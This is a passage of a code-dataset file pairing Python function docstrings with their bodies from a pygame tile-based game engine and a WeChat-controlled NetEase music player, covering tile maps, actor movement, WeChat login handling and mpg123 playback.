{"docstring": "\"\"\"Stitch tiles from swatch to layer surfaces.\n\nPiece together layers/surfaces from corresponding tile graphic\nnames, using the specified tile swatch. Keep track of\nmetadata, including passability.\n\nArgs:\n  tilesheet_name (str): directory name of the swatch to use\n  tile_ids (list): 3d list where list[layer][row][tile]\n\nExamples:\n  Make a 2x2x1 tilemap:\n  >>> tiles = [[[0, 0], [0, 0]]]\n  >>> tilemap = TileMap('debug', tiles)\n\n\"\"\"\n\n# create the layer images and tile properties\n", "func_signal": "def __init__(self, tilesheet_name, tile_ids):\n", "code": "tilesheet = Tilesheet.from_resources(tilesheet_name)\nfirst_layer = tile_ids[0]\n\nwidth_tiles = len(first_layer[0])\nheight_tiles = len(first_layer)\ndepth_tiles = len(tile_ids)\ndimensions_in_tiles = (width_tiles, height_tiles, depth_tiles)\n\ntile_size = tilesheet.tiles[0].size\ntile_width, tile_height = tile_size\nlayer_width = len(first_layer[0]) * tile_width\nlayer_height = len(first_layer) * tile_height\nlayer_size = (layer_width, layer_height)\n\ntiles = []\nlayer_images = []\nimpassable_rects = []\nanimated_tile_stack = {i: set() for i in range(depth_tiles)}\n\nfor z, layer in enumerate(tile_ids):\n    new_layer = pygame.Surface(layer_size, pygame.SRCALPHA, 32)\n    new_layer.fill([0, 0, 0, 0])\n\n    for y, row_of_tile_ids in enumerate(layer):\n\n        for x, tile_id in enumerate(row_of_tile_ids):\n            # is this right...?\n            tile_index = (((z - 1) * height_tiles * width_tiles) +\n                          (y * width_tiles) + x)\n            tile = tilesheet[tile_id]\n\n            # if not on first layer, merge flags down to first\n            if z:\n                tile_index = (y * width_tiles) + x\n                tiles[tile_index].flags.update(tile.flags)\n            else:\n                tiles.append(tile)\n\n            # -1 is air/nothing\n            if tile.tilesheet_id == -1:\n\n                continue\n\n            # blit tile subsurface onto respective layer\n            tile_position = (x * tile_width, y * tile_height)\n            new_layer.blit(tile.subsurface, tile_position)\n\n            # is this tile an animation?\n            if tile.tilesheet_id in tilesheet.animated_tiles:\n                animated_tile = (tilesheet.\n                                 animated_tiles[tile.tilesheet_id])\n                animation_info = (animated_tile, tile_position)\n                animated_tile_stack[z].add(animation_info)\n\n            # finally passability!\n            if 'impass_all' in tile.flags:\n                impassable_rects.append(pygame.Rect(tile_position,\n                                                    tile_size))\n\n    layer_images.append(new_layer)\n\nself.tilesheet = tilesheet\nself.layer_images = layer_images\nself.tiles = tiles\nself.impassable_rects = impassable_rects\nself.animated_tile_stack = animated_tile_stack\nself.dimensions_in_tiles = dimensions_in_tiles\n\n# the 3D list of Tilesheet tile IDs\n# which constructed this TileMap. It\n# is not updated when self.tiles is.\nself._tile_ids = tile_ids", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Blit all of the animated tiles from a\ndesignated layer to the supplied viewport.\n\nArgs:\n    viewport (render.Viewport): --\n    layer (int): The nth layer of animated tiles\n        which to blit to viewport.\n\n\"\"\"\n\n# i have to start using sprite groups for this\n", "func_signal": "def blit_layer_animated_tiles(self, viewport, layer):\n", "code": "for tile_anim, position in self.animated_tile_stack[layer]:\n    viewport.surface.blit(tile_anim.image,\n                          viewport.relative_position(position))", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Set the direction this actor is facing.\n\nArgs:\n    new_direction (constants.Direction): The new direction\n        for the actor to face.\n\nRaises:\n    AttributeError: If the new value is not a valid object\n        of the :class:`constants.Direction` class or if\n        the actor has no `walkabout` property.\n\n\"\"\"\n\n", "func_signal": "def direction(self, new_direction):\n", "code": "if self.walkabout is None:\n\n    raise AttributeError(\"Actor has no 'walkabout' property\")\n\nif not isinstance(new_direction, constants.Direction):\n\n    raise AttributeError((\"Direction must be a valid \"\n                          \"constants.Direction value\"))\n\nelse:\n    self.walkabout.direction = new_direction", "path": "hypatia\\actor.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"\n\nArgs:\n  name (str): --\n  surface (pygame.Surface): --\n  tiles (iter): --\n  tile_size (tuple): (x, y) pixel dimensions of the tiles which\n    comprise the Tilesheet surface.\n  animated_tiles (dict): tile_id -> AnimatedSprite:\n    {0: AnimatedSprite(...), 1: AnimatedSprite(...), ...}.\n\n\"\"\"\n\n", "func_signal": "def __init__(self, name, surface, tiles, tile_size, animated_tiles=None):\n", "code": "self.name = name\nself.surface = surface\nself.tiles = tiles\nself.tile_size = tile_size\nself.animated_tiles = animated_tiles\nself.animated_tiles_group = (pygame.sprite.\n                             Group(*animated_tiles.values()))", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"create subsurface of tilesheet surface using topleft\nposition on tilesheet.\n\nArgs:\n  tilesheet_id (int): Index belonging to this Tile in its\n    respective Tilesheet. The tile number on a Tilesheet.\n  tilesheet_surface (Surface): Surface used for\n    creating Tile subsurface.\n  tile_size (tuple): (x, y) where x and y are integers\n    defining the pixel dimensions of a tile.\n  flags (set): Set of strings which acts as attributes, e.g.,\n    \"impass_all.\"\n\n\"\"\"\n\n", "func_signal": "def __init__(self, tilesheet_id, tilesheet_surface, tile_size, flags=None):\n", "code": "tilesheet_width_in_tiles = (tilesheet_surface.get_size()[0] /\n                            tile_size[0])\ntop_left_in_tiles = index_to_coord(tilesheet_width_in_tiles,\n                                   tilesheet_id)\nsubsurface_top_left = (top_left_in_tiles[0] * tile_size[0],\n                       top_left_in_tiles[1] * tile_size[1])\nposition_rect = pygame.Rect(subsurface_top_left, tile_size)\nself.area_on_tilesheet = position_rect\nself.subsurface = tilesheet_surface.subsurface(position_rect)\nself.flags = flags or set()\nself.tilesheet_id = tilesheet_id\nself.size = tile_size", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Test physics.Velocity class.\n\n\"\"\"\n\n", "func_signal": "def test_velocity():\n", "code": "velocity = physics.Velocity(1, 2)\nassert velocity.x == 1 and velocity.y == 2\n\nvelocity = physics.Velocity()\nassert velocity.x == 0 and velocity.y == 0\n\nvelocity = physics.Velocity(x=1, y=2)\nassert velocity.x == 1 and velocity.y == 2\n\nvelocity = physics.Velocity(-22, 55)\nassert (constants.Direction.from_velocity(velocity) ==\n        constants.Direction.south_west)", "path": "tests\\test_physics.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Fetch TileProperties by pixel coordinate.\n\nArgs:\n  coord (tuple): (int x, int y) coordinate;  units in pixels.\n    Coord only has to be in the area of tile.\n\nReturns:\n  TileInfo\n\nExamples:\n  Let's assume 10x10 tiles...\n  >>> tiles = [[[0, 10], [-1, 4]]]\n  >>> tilemap = TileMap('debug', tiles)\n  >>> 'impass_all' in tilemap.get_info((12, 12)).flags\n  True\n\n\"\"\"\n\n", "func_signal": "def get_info(self, coord):\n", "code": "tile_width, tile_height = self.tilesheet.tile_size\npixel_x, pixel_y = coord\ntile_x = pixel_x // tile_width\ntile_y = pixel_y // tile_height\n\nreturn self[(tile_x, tile_y)]", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Create a Tilesheet from a name, corresponding to a path\npointing to a tilesheet zip archive.\n\nArgs:\n  tilesheet_name (str): this string is appended to the default\n    resources/tilesheets location.\n\nReturns:\n  Tilesheet: initialized utilizing information from the\n    respective tilesheet zip's tilesheet.png and tilesheet.ini.\n\n\"\"\"\n\n# path to the zip containing tilesheet.png and tilesheet.ini\n", "func_signal": "def from_resources(cls, tilesheet_name):\n", "code": "resource = resources.Resource('tilesheets', tilesheet_name)\nzip_path = os.path.join('resources',\n                        'tilesheets',\n                        tilesheet_name + '.zip')\n\ntilesheet_surface = pygame.image.load(resource['tilesheet.png'])\nconfig = resource['tilesheet.ini']\n\n# build the meta\nflags = {int(k): set(v.split(',')) for k, v in config.items('flags')}\ntile_width = config.getint('meta', 'tile_width')\ntile_height = config.getint('meta', 'tile_height')\ntile_size = (tile_width, tile_height)\ntilesheet_width, tilesheet_height = tilesheet_surface.get_size()\ntilesheet_width_in_tiles = tilesheet_width // tile_width\ntilesheet_height_in_tiles = tilesheet_height // tile_height\ntotal_tiles = tilesheet_width_in_tiles * tilesheet_height_in_tiles\n\n# tile initialization; buid all the tiles\ntiles = []\n\nfor tilesheet_id in range(total_tiles):\n    tile = Tile(tilesheet_id=tilesheet_id,\n                tilesheet_surface=tilesheet_surface,\n                tile_size=tile_size,\n                flags=flags.get(tilesheet_id, None))\n    tiles.append(tile)\n\n# for effects and animations\nanimated_tiles = {}\n\n# if animations are present, let's piece together some\n# PygAnimations using tile data.\nif config.has_section('animations'):\n    # used for checking which animation we're on\n    seen_tile_ids = set()\n    frame_buffer = []\n\n    for tile_id, animation_string in config.items('animations'):\n        tile_id = int(tile_id)\n        frame_duration, next_tile_id = animation_string.split(',')\n        frame_duration = int(frame_duration)  # frame dur is in MS\n        next_tile_id = int(next_tile_id)\n        frame_buffer.append((tiles[tile_id].subsurface,\n                             frame_duration))\n\n        # NOTE: outdated needs to use new anim sys\n        if next_tile_id in seen_tile_ids:\n            tile_anim = (animatedsprite.\n                         AnimatedSprite.\n                         from_surface_duration_list(frame_buffer))\n            animated_tiles[next_tile_id] = tile_anim\n            frame_buffer = []\n            seen_tile_ids = set()\n\n        seen_tile_ids.add(tile_id)\n\n# functions which return a PygAnimation, and accept a surface\nif config.has_section('animate_effect'):\n    effects = {'cycle': sprites.palette_cycle}\n\n    for tile_id, effect in config.items('animate_effect'):\n        tile_id = int(tile_id)\n        corresponding_tile = tiles[tile_id].subsurface\n        animated_tiles[tile_id] = effects[effect](corresponding_tile)\n\nreturn Tilesheet(tilesheet_name, tilesheet_surface,\n                 tiles, tile_size, animated_tiles)", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Modify human player's positional data legally (check\nfor collisions).\nNote:\n  Will round down to nearest probable step\n  if full step is impassable.\n  Needs to use velocity instead...\nArgs:\n  direction (constants.Direction):\n\n\"\"\"\n\n", "func_signal": "def move(self, game, direction):\n", "code": "self.walkabout.direction = direction\n\n# hack for incorporating new velocity system, will update later\nif direction in (constants.Direction.north, constants.Direction.south):\n    planned_movement_in_pixels = self.velocity.y\nelse:\n    planned_movement_in_pixels = self.velocity.x\n\nadj_speed = game.screen.time_elapsed_milliseconds / 1000.0\niter_pixels = max([1, int(planned_movement_in_pixels)])\n\n# test a series of positions\nfor pixels in range(iter_pixels, 0, -1):\n    # create a rectangle at the new position\n    new_topleft_x, new_topleft_y = self.walkabout.topleft_float\n\n    # what's going on here\n    if pixels == 2:\n        adj_speed = 1\n\n    if direction == constants.Direction.north:\n        new_topleft_y -= pixels * adj_speed\n    elif direction == constants.Direction.east:\n        new_topleft_x += pixels * adj_speed\n    elif direction == constants.Direction.south:\n        new_topleft_y += pixels * adj_speed\n    elif direction == constants.Direction.west:\n        new_topleft_x -= pixels * adj_speed\n\n    destination_rect = pygame.Rect((new_topleft_x, new_topleft_y),\n                                   self.walkabout.size)\n    collision_rect = self.walkabout.rect.union(destination_rect)\n\n    if not game.scene.collide_check(collision_rect):\n        # we're done, we can move!\n        new_topleft = (new_topleft_x, new_topleft_y)\n        self.walkabout.action = constants.Action.walk\n        animation = self.walkabout.current_animation()\n        self.walkabout.size = animation.largest_frame_size()\n        self.walkabout.rect = destination_rect\n        self.walkabout.topleft_float = new_topleft\n\n        return True\n\n# never found an applicable destination\nself.walkabout.action = constants.Action.stand\n\nreturn False", "path": "hypatia\\player.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"This is a debug feature. Create a 3D list of tile names using\nASCII symbols. Supports layers.\n\nUsed for reading tilemap.txt.\n\nReturns:\n    TileMap: --\n\n\"\"\"\n\n# GET TILESHEET NAME FROM THE FIRST LINE, REMOVE FIRST LINE\n", "func_signal": "def from_string(cls, map_string, separator=' '):\n", "code": "tilesheet_name, layers_string = map_string.split('\\n', 1)\n\n# NOTE: I'm using strip('\\n') because I can't seem to make\n# the \\n at the end of map-string.txt to go away.\n# watch the quirky wording; layers_string >> layer_strings\nlayer_strings = layers_string.strip('\\n').split('\\n\\n')\n\n# transform our characters into a 3D list of tile graphic names\nlayers = []\n\nfor layer_string in layer_strings:\n    layer = [[int(tile_id) for tile_id in row.split(separator)]\n             for row in layer_string.split('\\n')]\n    layers.append(layer)\n\nreturn TileMap(tilesheet_name, layers)", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Respond to an NPC in the direction of at_direction. Change\nthis actor's direction. Display this actor's say_text attribute\non the provided dialogbox.\n\n\nArgs:\n    at_direction (constants.Direction): The new direction\n        for this actor to face.\n    dialogbox (dialog.DialogBox): This actor's say_text\n        attribute will be printed to this.\n\nRaises:\n    NoActorResponse: This NPC has no response for the\n        included reason.\n    AttributeError: The actor has no `walkabout` property.\n\nNotes:\n    Even if this actor doesn't say anything, it will\n    change the direction it's facing.\n\n    This method is typically called by another\n    actor's :meth:`actor.Actor.talk()`.\n\n\"\"\"\n\n", "func_signal": "def get_response(self, at_direction, dialogbox):\n", "code": "if self.walkabout is None:\n\n    raise AttributeError(\"Actor has no 'walkabout' property\")\n\nself.walkabout.direction = (constants.Direction.\n                            opposite(at_direction))\n\nif self.say_text:\n    dialogbox.set_message(self.say_text)\nelse:\n\n    raise NoActorResponse(NoResponseReason.no_say_text)", "path": "hypatia\\actor.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Trigger another actor's :meth:`actor.Actor.say()` if\nthey are immediately *in front* of this actor.\n\nSee Also:\n    * :attribute:`animations.Walkabout.direction`\n    * :attribute:`Actor.direction`\n    * :meth:`actor.Actor.say()`\n\nArgs:\n    npcs (List[player.Npc]): NPCs to check for\n        collisions immediately in front of this\n        actor.\n    dialogbox (dialog.DialogBox): The dialogbox which\n        another actor will print to if they have\n        something to say.\n\nRaises:\n    ActorCannotTalk: If the actor cannot speak to\n        the `npcs` around.\n\n\"\"\"\n\n", "func_signal": "def talk(self, npcs, dialogbox):\n", "code": "if self.walkabout is None:\n\n    raise ActorCannotTalk((\"Actor has no 'direction' to face \"\n                           \"when talking.\"))\n\n# get the current direction, check a bit in front with a rect\n# to talk to npc if collide\nfacing = self.walkabout.direction\n\n# The pixel offset which acts as the collision boundary\n# for checking if there is an actor to get a response from\n# in front of this actor.\ndisposition = constants.Direction.disposition(facing)\n\ntalk_rect = self.walkabout.rect.copy()\ntalk_rect.move_ip(disposition)\n\nfor npc in npcs:\n\n    if npc.walkabout.rect.colliderect(talk_rect):\n\n        try:\n            npc.get_response(facing, dialogbox)\n\n        # NOTE: I'm just being explicit and showing off\n        # the good feature of having a reason for an\n        # NPC not being able to respond. This currently\n        # does nothing...\n        except NoActorResponse as no_response:\n\n            if response_failure is NoResponseReason.no_say_text:\n                # The NPC we're seeking a response from lacks\n                # a value for say text.\n                pass", "path": "hypatia\\actor.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"Create the user-unfriendly string for the tilemap.\n\nUsed for creating tilemap.txt.\n\nArgs:\n  separator (str): can be ''\n\nReturns:\n    str: --\n\n\"\"\"\n\n", "func_signal": "def to_string(self, separator=' '):\n", "code": "output_string = ''\n\n# create map layers\nlayers = []\nmax_digits = len(str(len(self.tilesheet.tiles))) - 1\nid_format = '%0' + str(max_digits) + 'd'\n\nfor layer in self._tile_ids:\n    layer_lines = []\n\n    for row in layer:\n        row_string = separator.join([id_format % i for i in row])\n\n        layer_lines.append(row_string)\n\n    layer_string = '\\n'.join(layer_lines)\n    layers.append(layer_string)\n\nlayers_string = '\\n\\n'.join(layers)\noutput_string += layers_string\n\nreturn self.tilesheet.name + '\\n' + output_string", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "\"\"\"This is for game.py. These need to be launched after pygame\nhas started.\n\n\"\"\"\n\n", "func_signal": "def runtime_setup(self):\n", "code": "layer_images = self.layer_images\n\nfor image in layer_images:\n    image.convert()\n    image.convert_alpha()\n\nfor i, tile_animation in self.tilesheet.animated_tiles.items():\n    tile_animation.convert_alpha()\n\nreturn None", "path": "hypatia\\tiles.py", "repo_name": "hypatia-software-org/hypatia-engine", "stars": 280, "license": "mit", "language": "python", "size": 28893}
{"docstring": "'''\n    get a list of friends or mps for updating local contact\n'''\n", "func_signal": "def update_local_friends(core, l):\n", "code": "fullList = core.memberList + core.mpList\nfor friend in l:\n    if 'NickName' in friend:\n        utils.emoji_formatter(friend, 'NickName')\n    if 'DisplayName' in friend:\n        utils.emoji_formatter(friend, 'DisplayName')\n    oldInfoDict = utils.search_dict_list(\n        fullList, 'UserName', friend['UserName'])\n    if oldInfoDict is None:\n        oldInfoDict = copy.deepcopy(friend)\n        if oldInfoDict['VerifyFlag'] & 8 == 0:\n            core.memberList.append(oldInfoDict)\n        else:\n            core.mpList.append(oldInfoDict)\n    else:\n        update_info_dict(oldInfoDict, friend)", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "''' init is the only method defined in core.py\n    alive is value showing whether core is running\n        - you should call logout method to change it\n        - after logout, a core object can login again\n    storageClass only uses basic python types\n        - so for advanced uses, inherit it yourself\n    receivingRetryCount is for receiving loop retry\n        - it's 5 now, but actually even 1 is enough\n        - failing is failing\n'''\n", "func_signal": "def __init__(self):\n", "code": "self.alive = False\nself.storageClass = storage.Storage()\nself.memberList = self.storageClass.memberList\nself.mpList = self.storageClass.mpList\nself.chatroomList = self.storageClass.chatroomList\nself.msgList = self.storageClass.msgList\nself.loginInfo = {}\nself.s = requests.Session()\nself.uuid = None\nself.functionDict = {'FriendChat': {}, 'GroupChat': {}, 'MpChat': {}}\nself.useHotReload, self.hotReloadDir = False, 'itchat.pkl'\nself.receivingRetryCount = 5", "path": "itchat\\core.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# keep playing info in line 1\n", "func_signal": "def get_param(self, prompt_string):\n", "code": "curses.echo()\nself.screen.move(4, 1)\nself.screen.clrtobot()\nself.addstr(5, self.startcol, prompt_string,\n            curses.color_pair(1))\nself.screen.refresh()\ninfo = self.screen.getstr(10, self.startcol, 60)\nif info == '':\n    return '/return'\nelif info.strip() is '':\n    return self.get_param(prompt_string)\nelse:\n    return info", "path": "neteaseApi\\ui.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# The end of stack\n", "func_signal": "def dispatch_enter(self, idx):\n", "code": "netease = self.netease\ndatatype = self.datatype\ntitle = self.title\ndatalist = self.datalist\noffset = self.offset\nindex = self.index\nself.stack.append([datatype, title, datalist, offset, index])\n\nif idx > len(self.datalist):\n    return False\n\nif datatype == 'main':\n    self.choice_channel(idx)\n\n# \u8be5\u827a\u672f\u5bb6\u7684\u70ed\u95e8\u6b4c\u66f2\nelif datatype == 'artists':\n    artist_name = datalist[idx]['artists_name']\n    artist_id = datalist[idx]['artist_id']\n\n    self.datatype = 'artist_info'\n    self.title += ' > ' + artist_name\n    self.datalist = [\n        {\n            'item': '{}\u7684\u70ed\u95e8\u6b4c\u66f2'.format(artist_name),\n            'id': artist_id,\n        }, {\n            'item': '{}\u7684\u6240\u6709\u4e13\u8f91'.format(artist_name),\n            'id': artist_id,\n        }\n    ]\n\nelif datatype == 'artist_info':\n    self.title += ' > ' + datalist[idx]['item']\n    artist_id = datalist[0]['id']\n    if idx == 0:\n        self.datatype = 'songs'\n        songs = netease.artists(artist_id)\n        self.datalist = netease.dig_info(songs, 'songs')\n\n    elif idx == 1:\n        albums = netease.get_artist_album(artist_id)\n        self.datatype = 'albums'\n        self.datalist = netease.dig_info(albums, 'albums')\n\n# \u8be5\u4e13\u8f91\u5305\u542b\u7684\u6b4c\u66f2\nelif datatype == 'albums':\n    album_id = datalist[idx]['album_id']\n    songs = netease.album(album_id)\n    self.datatype = 'songs'\n    self.datalist = netease.dig_info(songs, 'songs')\n    self.title += ' > ' + datalist[idx]['albums_name']\n\n# \u7cbe\u9009\u6b4c\u5355\u9009\u9879\nelif datatype == 'playlists':\n    data = self.datalist[idx]\n    self.datatype = data['datatype']\n    self.datalist = netease.dig_info(data['callback'](), self.datatype)\n    self.title += ' > ' + data['title']\n\n# \u5168\u7ad9\u7f6e\u9876\u6b4c\u5355\u5305\u542b\u7684\u6b4c\u66f2\nelif datatype == 'top_playlists':\n    playlist_id = datalist[idx]['playlist_id']\n    songs = netease.playlist_detail(playlist_id)\n    self.datatype = 'songs'\n    self.datalist = netease.dig_info(songs, 'songs')\n    self.title += ' > ' + datalist[idx]['playlists_name']\n\n# \u5206\u7c7b\u7cbe\u9009\nelif datatype == 'playlist_classes':\n    # \u5206\u7c7b\u540d\u79f0\n    data = self.datalist[idx]\n    self.datatype = 'playlist_class_detail'\n    self.datalist = netease.dig_info(data, self.datatype)\n    self.title += ' > ' + data\n\n# \u67d0\u4e00\u5206\u7c7b\u7684\u8be6\u60c5\nelif datatype == 'playlist_class_detail':\n    # \u5b50\u7c7b\u522b\n    data = self.datalist[idx]\n    self.datatype = 'top_playlists'\n    self.datalist = netease.dig_info(\n        netease.top_playlists(data), self.datatype)\n    self.title += ' > ' + data\n\n# \u6b4c\u66f2\u8bc4\u8bba\nelif datatype in ['songs', 'fmsongs']:\n    song_id = datalist[idx]['song_id']\n    comments = self.netease.song_comments(song_id, limit=100)\n    try:\n        hotcomments = comments['hotComments']\n        comcomments = comments['comments']\n    except KeyError:\n        hotcomments = comcomments = []\n    self.datalist = []\n    for one_comment in hotcomments:\n        self.datalist.append(\n            u'(\u70ed\u95e8\u8bc4\u8bba)%s:%s' % (one_comment['user']['nickname'],\n                              one_comment['content']))\n    for one_comment in comcomments:\n        self.datalist.append(one_comment['content'])\n    self.datatype = 'comments'\n    self.title = '\u7f51\u6613\u4e91\u97f3\u4e50 > \u8bc4\u8bba:%s' % datalist[idx]['song_name']\n    self.offset = 0\n    self.index = 0\n\n# \u6b4c\u66f2\u699c\u5355\nelif datatype == 'toplists':\n    songs = netease.top_songlist(idx)\n    self.title += ' > ' + self.datalist[idx]\n    self.datalist = netease.dig_info(songs, 'songs')\n    self.datatype = 'songs'\n\n# \u641c\u7d22\u83dc\u5355\nelif datatype == 'search':\n    ui = self.ui\n    self.index = 0\n    self.offset = 0\n    if idx == 0:\n        # \u641c\u7d22\u7ed3\u679c\u53ef\u4ee5\u7528top_playlists\u5904\u7406\n        self.datatype = 'top_playlists'\n        self.datalist = ui.build_search('search_playlist')\n        self.title = '\u7cbe\u9009\u6b4c\u5355\u641c\u7d22\u5217\u8868'\n\n    elif idx == 1:\n        self.datatype = 'songs'\n        self.datalist = ui.build_search('songs')\n        self.title = '\u6b4c\u66f2\u641c\u7d22\u5217\u8868'\n\n    elif idx == 2:\n        self.datatype = 'artists'\n        self.datalist = ui.build_search('artists')\n        self.title = '\u827a\u672f\u5bb6\u641c\u7d22\u5217\u8868'\n\n    elif idx == 3:\n        self.datatype = 'albums'\n        self.datalist = ui.build_search('albums')\n        self.title = '\u4e13\u8f91\u641c\u7d22\u5217\u8868'", "path": "neteaseApi\\menu.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "''' when finish login (scanning qrcode)\n * syncUrl and fileUploadingUrl will be fetched\n * deviceid and msgid will be generated\n * skey, wxsid, wxuin, pass_ticket will be fetched\n'''\n", "func_signal": "def process_login_info(core, loginContent):\n", "code": "regx = r'window.redirect_uri=\"(\\S+)\";'\ncore.loginInfo['url'] = re.search(regx, loginContent).group(1)\nheaders = { 'User-Agent' : config.USER_AGENT }\nr = core.s.get(core.loginInfo['url'], headers=headers, allow_redirects=False)\ncore.loginInfo['url'] = core.loginInfo['url'][:core.loginInfo['url'].rfind('/')]\nfor indexUrl, detailedUrl in (\n        (\"wx2.qq.com\"      , (\"file.wx2.qq.com\", \"webpush.wx2.qq.com\")),\n        (\"wx8.qq.com\"      , (\"file.wx8.qq.com\", \"webpush.wx8.qq.com\")),\n        (\"qq.com\"          , (\"file.wx.qq.com\", \"webpush.wx.qq.com\")),\n        (\"web2.wechat.com\" , (\"file.web2.wechat.com\", \"webpush.web2.wechat.com\")),\n        (\"wechat.com\"      , (\"file.web.wechat.com\", \"webpush.web.wechat.com\"))):\n    fileUrl, syncUrl = ['https://%s/cgi-bin/mmwebwx-bin' % url for url in detailedUrl]\n    if indexUrl in core.loginInfo['url']:\n        core.loginInfo['fileUrl'], core.loginInfo['syncUrl'] = \\\n            fileUrl, syncUrl\n        break\nelse:\n    core.loginInfo['fileUrl'] = core.loginInfo['syncUrl'] = core.loginInfo['url']\ncore.loginInfo['deviceid'] = 'e' + repr(random.random())[2:17]\ncore.loginInfo['BaseRequest'] = {}\nfor node in xml.dom.minidom.parseString(r.text).documentElement.childNodes:\n    if node.nodeName == 'skey':\n        core.loginInfo['skey'] = core.loginInfo['BaseRequest']['Skey'] = node.childNodes[0].data\n    elif node.nodeName == 'wxsid':\n        core.loginInfo['wxsid'] = core.loginInfo['BaseRequest']['Sid'] = node.childNodes[0].data\n    elif node.nodeName == 'wxuin':\n        core.loginInfo['wxuin'] = core.loginInfo['BaseRequest']['Uin'] = node.childNodes[0].data\n    elif node.nodeName == 'pass_ticket':\n        core.loginInfo['pass_ticket'] = core.loginInfo['BaseRequest']['DeviceID'] = node.childNodes[0].data", "path": "itchat\\components\\login.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "'''\nRuns the given args in subprocess.Popen, and then calls the function\nonExit when the subprocess completes.\nonExit is a callable object, and popenArgs is a lists/tuple of args\nthat would give to subprocess.Popen.\n'''\n\n", "func_signal": "def popen_recall(self, onExit, popenArgs):\n", "code": "def runInThread(onExit, arg):\n    para = ['mpg123', '-R']\n    para[1:1] = self.mpg123_parameters\n    self.popen_handler = subprocess.Popen(para,\n                                          stdin=subprocess.PIPE,\n                                          stdout=subprocess.PIPE,\n                                          stderr=subprocess.PIPE)\n    self.popen_handler.stdin.write(b'V ' + str(self.info['playing_volume']).encode('utf-8') + b'\\n')\n    if arg:\n        self.popen_handler.stdin.write(b'L ' + arg.encode('utf-8') + b'\\n')\n    else:\n        self.next_idx()\n        onExit()\n        return\n\n    self.popen_handler.stdin.flush()\n\n    self.process_first = True\n    while True:\n        if self.playing_flag is False:\n            break\n\n        strout = self.popen_handler.stdout.readline().decode('utf-8')\n\n        if re.match('^\\@F.*$', strout):\n            process_data = strout.split(' ')\n            process_location = float(process_data[4])\n            if self.process_first:\n                self.process_length = process_location\n                self.process_first = False\n                self.process_location = 0\n            else:\n                self.process_location = self.process_length - process_location  # NOQA\n            continue\n        elif strout[:2] == '@E':\n            # get a alternative url from new api\n            sid = popenArgs['song_id']\n            new_url = NetEase().songs_detail_new_api([sid])[0]['url']\n            if new_url is None:\n                log.warning(('Song {} is unavailable '\n                             'due to copyright issue.').format(sid))\n                break\n            log.warning(\n                'Song {} is not compatible with old api.'.format(sid))\n            popenArgs['mp3_url'] = new_url\n\n            self.popen_handler.stdin.write(b'\\nL ' + new_url.encode('utf-8') + b'\\n')\n            self.popen_handler.stdin.flush()\n            self.popen_handler.stdout.readline()\n        elif strout == '@P 0\\n':\n            self.popen_handler.stdin.write(b'Q\\n')\n            self.popen_handler.stdin.flush()\n            self.popen_handler.kill()\n            break\n    if self.playing_flag:\n        self.next_idx()\n        onExit()\n    return\n\ndef getLyric():\n    if 'lyric' not in self.songs[str(self.playing_id)].keys():\n        self.songs[str(self.playing_id)]['lyric'] = []\n    if len(self.songs[str(self.playing_id)]['lyric']) > 0:\n        return\n    netease = NetEase()\n    lyric = netease.song_lyric(self.playing_id)\n    if lyric == [] or lyric == '\u672a\u627e\u5230\u6b4c\u8bcd':\n        return\n    lyric = lyric.split('\\n')\n    self.songs[str(self.playing_id)]['lyric'] = lyric\n    return\n\ndef gettLyric():\n    if 'tlyric' not in self.songs[str(self.playing_id)].keys():\n        self.songs[str(self.playing_id)]['tlyric'] = []\n    if len(self.songs[str(self.playing_id)]['tlyric']) > 0:\n        return\n    netease = NetEase()\n    tlyric = netease.song_tlyric(self.playing_id)\n    if tlyric == [] or tlyric == '\u672a\u627e\u5230\u6b4c\u8bcd\u7ffb\u8bd1':\n        return\n    tlyric = tlyric.split('\\n')\n    self.songs[str(self.playing_id)]['tlyric'] = tlyric\n    return\n\ndef cacheSong(song_id, song_name, artist, song_url):\n    def cacheExit(song_id, path):\n        self.songs[str(song_id)]['cache'] = path\n\n    self.cache.add(song_id, song_name, artist, song_url, cacheExit)\n    self.cache.start_download()\n\nif 'cache' in popenArgs.keys() and os.path.isfile(popenArgs['cache']):\n    thread = threading.Thread(target=runInThread,\n                              args=(onExit, popenArgs['cache']))\nelse:\n    thread = 